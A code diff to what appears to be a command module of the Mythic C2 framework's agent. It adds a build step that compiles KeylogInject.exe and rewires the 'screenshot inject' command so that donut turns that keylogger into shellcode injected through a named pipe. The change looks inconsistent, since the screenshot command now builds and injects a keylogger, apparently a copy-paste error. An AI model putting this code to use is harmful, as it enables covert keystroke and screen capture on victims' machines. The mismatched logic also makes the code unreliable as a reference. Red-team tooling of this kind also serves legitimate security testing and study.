@@ -6,6 +6,12 @@ from os import path
 from mythic_payloadtype_container.MythicRPC import *
 import base64
 import donut
+import tempfile
+from distutils.dir_util import copy_tree
+import shutil
+
+from agent_functions.keylog_inject import KEYLOG_INJECT_PATH
+
 
 class ScreenshotInjectArguments(TaskArguments):
 
@@ -81,10 +87,25 @@ class ScreenshotInjectCommand(CommandBase):
     browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein", for_new_ui=True)
     attackmapping = ["T1113"]
 
+    async def build_screenshotinject(self):
+        global KEYLOG_INJECT_PATH
+        agent_build_path = tempfile.TemporaryDirectory()
+        outputPath = "{}/KeylogInject/bin/Release/KeylogInject.exe".format(agent_build_path.name)
+            # shutil to copy payload files over
+        copy_tree(self.agent_code_path, agent_build_path.name)
+        shell_cmd = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release {}/KeylogInject/KeylogInject.csproj".format(agent_build_path.name)
+        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
+                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
+        stdout, stderr = await proc.communicate()
+        if not path.exists(outputPath):
+            raise Exception("Failed to build KeylogInject.exe:\n{}".format(stderr.decode()))
+        shutil.copy(outputPath, KEYLOG_INJECT_PATH)
+
+
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        exePath = "/srv/ScreenshotInject.exe"
-        if not path.exists(exePath):
-            raise Exception("Could not find {}".format(exePath))
+        global KEYLOG_INJECT_PATH
+        if not path.exists(KEYLOG_INJECT_PATH):
+            raise Exception("Could not find {}".format(KEYLOG_INJECT_PATH))
         donutPath = "/Mythic/agent_code/donut"
         if not path.exists(donutPath):
             raise Exception("Could not find {}".format(donutPath))
@@ -92,7 +113,7 @@ class ScreenshotInjectCommand(CommandBase):
         proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
         stdout, stderr = await proc.communicate()
         
-        command = "{} -f 1 -p \"{}\" {}".format(donutPath, task.args.get_arg("pipe_name"), exePath)
+        command = "{} -f 1 -p \"{}\" {}".format(donutPath, task.args.get_arg("pipe_name"), KEYLOG_INJECT_PATH)
         # need to go through one more step to turn our exe into shellcode
         proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                         stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
